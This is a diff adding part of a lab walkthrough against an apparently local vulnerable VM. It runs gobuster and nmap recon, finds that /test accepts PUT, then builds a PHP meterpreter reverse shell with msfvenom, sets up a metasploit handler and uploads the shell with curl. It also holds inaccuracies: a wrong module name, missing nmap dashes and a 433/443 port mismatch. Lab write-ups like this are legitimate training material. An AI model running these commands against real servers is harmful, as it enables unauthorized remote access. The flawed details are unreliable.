@@ -77,3 +77,83 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 2021/04/22 13:23:05 Finished
 ===============================================================
 ```
+Looks like the directory that gobuster found was ```/test``` and ```/%7Echeckout%7E```
+<img width="386" alt="Screen Shot 2021-04-22 at 8 59 57 PM" src="https://user-images.githubusercontent.com/81980702/115807226-d699b780-a3ad-11eb-8c69-98e43808be09.png">
+
+The parent directory brings us back to the picture and we can tell that it is using lighttpd/1.4.28
+
+Through our reconnaissance, we can tell that the server is running ```OpenSSH 5.9p1```. Running command ```searchsploit openSSH 5.9p1```. We can see this below 
+```
+-------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                |  Path
+-------------------------------------------------------------- ---------------------------------
+OpenSSH 2.3 < 7.7 - Username Enumeration                      | linux/remote/45233.py
+OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)                | linux/remote/45210.py
+OpenSSH < 6.6 SFTP (x64) - Command Execution                  | linux_x86-64/remote/45000.c
+OpenSSH < 6.6 SFTP - Command Execution                        | linux/remote/45001.py
+OpenSSH < 7.4 - 'UsePrivilegeSeparation Disabled' Forwarded U | linux/local/40962.txt
+OpenSSH < 7.4 - agent Protocol Arbitrary Library Loading      | linux/remote/40963.txt
+OpenSSH < 7.7 - User Enumeration (2)                          | linux/remote/45939.py
+-------------------------------------------------------------- ---------------------------------
+```
+using ``` ls -al /usr/share/nmap/scripts/ | grep -e "http-" ``` **Breakdown** -al = all with author. -e = extend pattern. We want to use these scripts below. 
+
+```
+`-rw-r--r-- 1 root root 20667 Oct 12  2020 http-enum.nse
+-rw-r--r-- 1 root root  7320 Oct 12  2020 http-methods.nse
+```
+Running ``` nmap sV -p 80 192.168.1.142 --script http-enum ```, I can see that the only directory is /test
+```
+PORT   STATE SERVICE
+80/tcp open  http
+| http-enum: 
+|_  /test/: Test page
+MAC Address: 00:0C:29:10:88:6E (VMware)
+```
+Running ``` nmap sV -p 80 192.168.1.142 --script http-methods ```, We can see the method supported is 
+```
+PORT   STATE SERVICE
+80/tcp open  http
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+MAC Address: 00:0C:29:10:88:6E (VMware)
+```
+Running ``` nmap sV -p 80 192.168.1.142 --script http-methods --script-args http-methods.url-path='/test' ```
+
+```
+PORT   STATE SERVICE
+80/tcp open  http
+| http-methods: 
+|   Supported Methods: PROPFIND DELETE MKCOL PUT MOVE COPY PROPPATCH LOCK UNLOCK GET POST OPTIONS
+|   Potentially risky methods: PROPFIND DELETE MKCOL PUT MOVE COPY PROPPATCH LOCK UNLOCK
+|_  Path tested: /test
+MAC Address: 00:0C:29:10:88:6E (VMware)
+```
+# Reverse shell 
+Running command ```msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.200 LPORT=1234 -f raw > shell.php```
+The pay load is set 
+
+using command ```msfconsole```, metasploit is brought up. 
+
+```
+use exploit/multi/handle 
+set payload php/meterpreter_reverse_tcp
+set LHOST 192.168.1.200
+set LPORT 1234
+```
+```
+curl -T shell.php http://192.168.1.142/test/shell.php --http1.0
+```
+<img width="515" alt="Screen Shot 2021-04-22 at 10 03 17 PM" src="https://user-images.githubusercontent.com/81980702/115812205-a0ad0100-a3b6-11eb-864b-e556149f86f0.png">
+
+click run on handler then click on the shell you imported on the website 
+
+There is an error, the box only runs on port 80 and 443. There is a fire wall. 
+```
+msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.200 LPORT=443 -f raw > shell.php
+```
+set LPORT 433 in metaexploit
+```
+curl -T shell.php http://192.168.1.142/test/reverse.php
+```
+Rename and upload 
